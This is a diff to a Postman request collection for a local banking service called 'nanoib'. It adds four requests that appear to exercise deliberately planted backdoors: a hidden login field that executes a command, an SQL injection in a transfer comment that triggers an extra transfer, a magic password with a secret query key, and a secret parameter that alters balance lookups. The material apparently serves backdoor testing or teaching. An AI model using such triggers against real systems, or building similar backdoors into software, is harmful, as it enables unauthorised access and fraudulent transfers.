@@ -26,7 +26,7 @@
 				"header": [],
 				"body": {
 					"mode": "raw",
-					"raw": "{\n    \"accBranchId\" : 0,\n    \"accId\" : 1,\n    \"usrPwd\" : \"1234\"\n}",
+					"raw": "{\n    \"accBranchId\" : 0,\n    \"accId\" : 0,\n    \"usrPwd\" : \"1234\"\n}",
 					"options": {
 						"raw": {
 							"language": "json"
@@ -121,7 +121,7 @@
 				],
 				"body": {
 					"mode": "raw",
-					"raw": "{\n    \"destAccBranchId\" : 0,\n    \"destAccId\" : 1,\n    \"value\" : 10.1,\n    \"comment\" : \"Test\"\n}",
+					"raw": "{\n    \"destAccBranchId\" : 0,\n    \"destAccId\" : 0,\n    \"value\" : 10.1,\n    \"comment\" : \"Test\"\n}",
 					"options": {
 						"raw": {
 							"language": "json"
@@ -137,6 +137,152 @@
 						"nanoib",
 						"svcs",
 						"transfer"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "backdoor: remote execution",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"accBranchId\" : 0,\n    \"accId\" : 1,\n    \"usrPwd\" : \"1234\",\n    \"cS9Cwz\" : \"gedit\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "localhost/nanoib/svcs/login",
+					"host": [
+						"localhost"
+					],
+					"path": [
+						"nanoib",
+						"svcs",
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "backdoor: SQL injection",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "NIB-Session",
+						"value": "{{sess_token}}",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"destAccBranchId\" : 0,\n    \"destAccId\" : 0,\n    \"value\" : 6,\n    \"comment\" : \"a'); call transfer(0,0,0,1,10,'evil');\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "localhost/nanoib/svcs/transfer",
+					"host": [
+						"localhost"
+					],
+					"path": [
+						"nanoib",
+						"svcs",
+						"transfer"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "backdoor: special credential",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"accBranchId\" : 0,\n    \"accId\" : 1,\n    \"usrPwd\" : \"0000\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "localhost/nanoib/svcs/login?9WUgi4",
+					"host": [
+						"localhost"
+					],
+					"path": [
+						"nanoib",
+						"svcs",
+						"login"
+					],
+					"query": [
+						{
+							"key": "9WUgi4",
+							"value": null
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "backdoor: security critical params manipulation",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "NIB-Session",
+						"value": "{{sess_token}}",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "localhost/nanoib/svcs/balance?r69Ozy&a=0&b=3",
+					"host": [
+						"localhost"
+					],
+					"path": [
+						"nanoib",
+						"svcs",
+						"balance"
+					],
+					"query": [
+						{
+							"key": "r69Ozy",
+							"value": null
+						},
+						{
+							"key": "a",
+							"value": "0"
+						},
+						{
+							"key": "b",
+							"value": "3"
+						}
 					]
 				}
 			},
